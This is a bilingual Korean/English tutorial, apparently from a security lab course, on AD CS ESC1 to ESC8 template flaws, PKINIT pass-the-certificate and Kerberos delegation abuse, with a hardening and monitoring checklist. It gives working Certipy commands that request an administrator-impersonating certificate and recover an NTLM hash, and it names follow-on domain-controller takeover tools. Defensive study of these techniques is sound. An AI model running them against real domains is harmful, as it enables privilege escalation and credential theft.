> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AD CS 취약점 분석 및 Kerberos 위임 심층 분석 (ESC1 ~ ESC14 & PKINIT / RBCD)

> 🏢 **연계 실습 랩**: [Lab 29: CertPwn - AD CS & Kerberos Delegation Security Lab](../../labs/29_adcs_kerberos_delegation_lab)  
> 🎯 **관련 워게임 트랙**: `adcs` (ADCS 인증서 침투·Kerberos 위임)

---

## 0. 개요 및 왜 AD CS와 Kerberos 위임인가?

현대 Windows 기업 도메인 환경에서 가장 치명적인 권한 상승(Privilege Escalation) 및 도메인 장악(Domain Dominance) 벡터 중 하나는 **Active Directory Certificate Services (AD CS)** 와 **Kerberos 위임(Delegation)** 메커니즘의 오설정(Misconfiguration)입니다.

SpecterOps의 2021년 백서 *"Certified Pre-Owned"* 발표 이후, AD CS는 전통적인 취약 패스워드나 미패치 취약점에 의존하지 않고도 도메인 일반 사용자(`Domain Users`) 권한에서 즉시 `Domain Admin` 또는 `Enterprise Admin` 권한으로 수직 상승할 수 있는 최고 위험 벡터로 인식되고 있습니다.

```
+-----------------------------------------------------------------------------------+
|                        AD CS & Kerberos 공격 체인 다이어그램                       |
+-----------------------------------------------------------------------------------+

 [ 일반 도메인 사용자 ]
         │
         ▼  (1) Certipy / Certify 로 취약 템플릿 열거 (ESC1: Enrollee Supplies SAN)
 [ AD CS 인증 기관 (CA) ]
         │
         ▼  (2) SAN에 Administrator@corp.local 지정 인증서 요청 및 서명 완료
 [ 위조된 Domain Admin 인증서 (.pfx) ]
         │
         ▼  (3) PKINIT (RFC 4556) 사전 인증 수행 -> Pass-the-Certificate
 [ 도메인 컨트롤러 (KDC) ]
         │  - TGT (Ticket Granting Ticket) 획득
         │  - PAC 디코딩 & UnPAC-the-Hash 로 NTLM 해시 복원
         ▼
 [ Kerberos 위임 악용 (S4U2Self / S4U2Proxy / RBCD) ]
         │
         ▼  (4) Domain Controller / 파일 서버 등 대상 서비스 티켓 위조
 [ 👑 도메인 완전 장악 (Domain Compromise) ]
+-----------------------------------------------------------------------------------+
```

---

## 1. AD CS 아키텍처 및 인증서 템플릿 취약점 (ESC1 ~ ESC8)

### 1.1 AD CS 핵심 개념

- **인증 기관 (CA, Certificate Authority)**: 도메인 내 인증서를 서명하고 발급하는 주체. Active Directory와 긴밀하게 통합되어 있습니다.
- **인증서 템플릿 (Certificate Template)**: 인증서의 용도, 주체(Subject) 생성 방식, 유효 기간, 등록 권한(Enrollment Permissions), EKU(Extended Key Usage)를 정의하는 청사진입니다.
- **EKU (Extended Key Usage)**: 인증서가 어떤 용도로 쓰일 수 있는지를 정의하는 OID.
  - `Client Authentication` (OID: `1.3.6.1.5.5.7.3.2`): Kerberos PKINIT 인증에 사용 가능
  - `Smart Card Logon` (OID: `1.3.6.1.4.1.311.20.2.2`): 스마트카드 기반 대화형 로그인 지원
  - `Any Purpose` (OID: `2.5.29.37.0`): 모든 용도로 사용 가능 (최고 위험)

### 1.2 ESC1 취약점: 등록자 제공 주체 대체 이름 (SAN) 악용

ESC1은 다음과 같은 4가지 조건이 동시에 충족될 때 발생합니다:
1. **CA 권한**: 엔터프라이즈 CA가 해당 템플릿 기반 인증서를 발급하도록 승인됨.
2. **등록 권한 (Enrollment Rights)**: 낮은 권한 그룹(예: `Domain Users`, `Authenticated Users`)에 등록 권한이 부여됨.
3. **관리자 승인 불필요**: `CT_FLAG_PEND_ALL_REQUESTS` 플래그 미설정 (자동 발급).
4. **등록자가 SAN 제공 허용**: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그 설정됨.
5. **클라이언트 인증 EKU 포함**: `Client Authentication`, `Smart Card Logon`, 또는 `Any Purpose` 포함.

이 경우 일반 사용자는 CSR 생성 시 `Subject Alternative Name (SAN)`에 도메인 관리자 UPN(`administrator@corp.local`)을 명시하여 CA에 전송하면, CA는 관리자 신원의 서명된 인증서(.pfx)를 즉시 발급합니다.

### 1.3 기타 주요 ESC 취약점 요약

| 분류 | 취약점 핵심 메커니즘 | 공격 영향도 |
|:---|:---|:---|
| **ESC1** | SAN에 임의 사용자 UPN 지정 가능 + Client Auth EKU | 임의 사용자(도메인 관리자) 사칭 인증서 즉시 획득 |
| **ESC2** | Any Purpose EKU 또는 EKU 미지정 템플릿 | 모든 목적으로 사용 가능 (SubCA 또는 클라이언트 인증) |
| **ESC3** | Enrollment Agent EKU 보유 템플릿 | 대리인 인증서를 발급받아 타인을 대신해 인증서 요청 |
| **ESC4** | 템플릿 ACL 쓰기 권한 오설정 | 취약하지 않은 템플릿을 공격자가 직접 ESC1 구조로 변조 |
| **ESC6** | CA 플래그 `EDITF_ATTRIBUTESUBJECTALTNAME2` 활성화 | 모든 템플릿에 대해 SAN 덮어쓰기 허용 (글로벌 ESC1) |
| **ESC8** | HTTP Web Enrollment (ADCS Web Service) NTLM 미서명 | NTLM Relay 공격을 통해 컴퓨터 계정/관리자 인증서 탈취 |

---

## 2. 공격 실습: Certipy를 이용한 ESC1 익스플로잇

### 2.1 AD CS 열거 및 취약 템플릿 탐색

```bash
# 도메인 내 모든 CA 및 인증서 템플릿 취약점 스캔
certipy find -u lowpriv_user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -stdout -vulnerable

# 취약한 ESC1 템플릿 출력 예시
# [*] Vulnerabilities:
#     ESC1: 'ESC1_WebAuth' template allows enrollee to supply SAN and has Client Authentication EKU
```

### 2.2 Domain Admin 인증서 요청 (SAN 주입)

```bash
# 일반 사용자 계정으로 Administrator SAN을 포함한 인증서 요청
certipy req -u lowpriv_user@corp.local -p 'Password123!' \
  -ca "CORP-DC-CA\\corp-DC-CA" \
  -target-ip 10.0.0.10 \
  -template ESC1_WebAuth \
  -upn administrator@corp.local \
  -out administrator.pfx
```

---

## 3. PKINIT (RFC 4556)과 Pass-the-Certificate

발급받은 `.pfx` 파일은 단순한 웹 인증서가 아니라, Kerberos KDC에 대화형으로 인증할 수 있는 암호학적 자격 증명입니다.

```bash
# PKINIT 사전 인증으로 도메인 관리자 TGT 및 NTLM 해시 획득
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10

# 출력:
# [*] Got TGT for 'administrator@CORP.LOCAL'
# [*] Saving credential cache to 'administrator.ccache'
# [*] Got hash for 'administrator@CORP.LOCAL': aad3b435b51404eeaad3b435b51404ee:b4d29a5342a344933a39e3381e4b9f29
```

- **UnPAC-the-Hash**: KDC가 티켓 발급 시 PAC 내부에 PAC_CREDENTIAL_INFO 구조체(NTLM 해시 복사본)를 포함하여 클라이언트에 반환하므로, 인증서만으로 평문/해시 복원이 가능합니다.
- **Pass-the-Hash / Pass-the-Ticket 연계**: `export KRB5CCNAME=administrator.ccache` 설정 후 `wmiexec.py`, `psexec.py`, `secretsdump.py`를 통해 즉시 DC를 장악합니다.

---

## 4. Kerberos 위임 공격 (Delegation Deepdive)

### 4.1 위임의 3가지 유형

1. **비제한 위임 (Unconstrained Delegation)**:
   - 서비스 계정이 인증한 클라이언트의 완전한 TGT를 메모리에 캐싱합니다.
   - 도메인 관리자가 해당 서비스에 접속하는 순간, LSASS에서 관리자 TGT를 덤프할 수 있습니다.
2. **제한 위임 (Constrained Delegation)**:
   - Kerberos 확장 프로토콜 **S4U2Self** (자신을 대신해 임의 사용자로 티켓 생성) 및 **S4U2Proxy** (지정된 SPN 서비스로 티켓 위임 전달)를 사용합니다.
   - 프로토콜 전환(`Protocol Transition`)이 활성화된 경우, 관리자의 상호작용 없이도 관리자 사칭 서비스 티켓 발급이 가능합니다.
3. **리소스 기반 제한 위임 (RBCD, Resource-Based Constrained Delegation)**:
   - 서비스 제공자가 스스로 자신의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성에 위임을 허용할 계정을 정의합니다.
   - 머신 계정 생성 권한(`MachineAccountQuota > 0`)이 있는 일반 사용자는 가상 컴퓨터 계정을 등록하고, 취약 컴퓨터 계정의 RBCD 속성을 조작하여 권한을 탈취합니다.

---

## 5. 엔터프라이즈 방어 및 하드닝 가이드

```
+-----------------------------------------------------------------------------------+
|                        AD CS & Kerberos 다층 방어 체계                            |
+-----------------------------------------------------------------------------------+

 1. 템플릿 하드닝:
    - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 해제 (주체는 AD 속성에서 자동 생성)
    - 고권한 템플릿에 'CA 관리자 승인(Manager Approval)' 강제

 2. Kerberos 보호 정책:
    - 민감 계정(Domain Admins 등)에 '계정이 민감하여 위임할 수 없음' 플래그 설정
    - Tier-0 관리자 계정을 'Protected Users' 보안 그룹에 필수 등록

 3. 프로토콜 보안:
    - AD CS HTTP Enrollment Web 서비스에서 NTLM 비활성화 또는 EPA 강제
    - LDAP/SMB 서명 및 채널 바인딩(Channel Binding Tokens) 강제

 4. 이상 징후 모니터링:
    - Event ID 4887 (인증서 발급) 중 SAN에 민감 계정이 포함된 로그 실시간 탐지
    - Event ID 4768 (Kerberos TGT 요청) 중 인증서 기반 사전 인증(PA-PK-AS-REQ) 감사
+-----------------------------------------------------------------------------------+
```

---

<a name="english"></a>

# AD CS Exploitation & Kerberos Delegation Deep Dive (ESC1 ~ ESC14 & PKINIT / RBCD)

> 🏢 **Hands-on Lab**: [Lab 29: CertPwn - AD CS & Kerberos Delegation Security Lab](../../labs/29_adcs_kerberos_delegation_lab)  
> 🎯 **Wargame Track**: `adcs` (AD CS PKI & Kerberos Delegation)

---

## 0. Executive Summary

Active Directory Certificate Services (AD CS) and Kerberos Delegation represent two of the most critical privilege escalation and lateral movement attack surfaces in modern Windows enterprise domains. Misconfigurations in certificate templates (such as ESC1) allow an unprivileged `Domain User` to impersonate `Domain Admins` without knowing passwords or exploiting binary memory vulnerabilities.

---

## 1. AD CS Architecture & Vulnerable Templates

### Key Components:
- **CA (Certificate Authority)**: Issues and signs X.509 certificates integrated with Active Directory.
- **Certificate Templates**: Blueprint defining validity, issuance policies, enrollment permissions, and Extended Key Usage (EKU).
- **EKUs**:
  - `Client Authentication` (OID: `1.3.6.1.5.5.7.3.2`): Allows Kerberos PKINIT authentication.
  - `Smart Card Logon` (OID: `1.3.6.1.4.1.311.20.2.2`): Used for interactive smartcard logon.

### ESC1 Anatomy:
ESC1 occurs when:
1. Low-privileged accounts have Enrollment rights.
2. Manager approval is NOT required.
3. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is enabled.
4. EKU includes Client Authentication or Smart Card Logon.

Attackers specify `administrator@domain.local` in the Subject Alternative Name (SAN), obtain a legitimate signed certificate, and authenticate as Domain Admin.

---

## 2. Exploitation with Certipy

```bash
# Enumerate vulnerable templates
certipy find -u lowpriv@corp.local -p 'Pass123' -dc-ip 10.0.0.10 -vulnerable

# Request certificate impersonating Domain Administrator
certipy req -u lowpriv@corp.local -p 'Pass123' \
  -ca "CORP-DC-CA\\corp-DC-CA" \
  -template ESC1_WebAuth \
  -upn administrator@corp.local \
  -out admin.pfx

# Authenticate via PKINIT & recover NTLM Hash (UnPAC-the-Hash)
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10
```

---

## 3. Kerberos Delegation Security

1. **Unconstrained Delegation**: Servers store user TGTs in LSASS.
2. **Constrained Delegation (S4U2Self & S4U2Proxy)**: Services can request tickets on behalf of users to specific backend services.
3. **Resource-Based Constrained Delegation (RBCD)**: Configured on the target resource via `msDS-AllowedToActOnBehalfOfOtherIdentity`.

---

## 4. Remediation & Hardening Checklist

1. **Disable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** on all sensitive templates. Build subjects from Active Directory instead.
2. Require **Manager Approval** (`CT_FLAG_PEND_ALL_REQUESTS`).
3. Add all privileged administrative accounts to the **`Protected Users`** security group and enforce **`Account is sensitive and cannot be delegated`**.
4. Disable NTLM on AD CS HTTP Web Enrollment endpoints or enable Extended Protection for Authentication (EPA).
5. Audit Event IDs **4887** (Certificate Issuance) and **4768** (TGT Request with PKINIT).
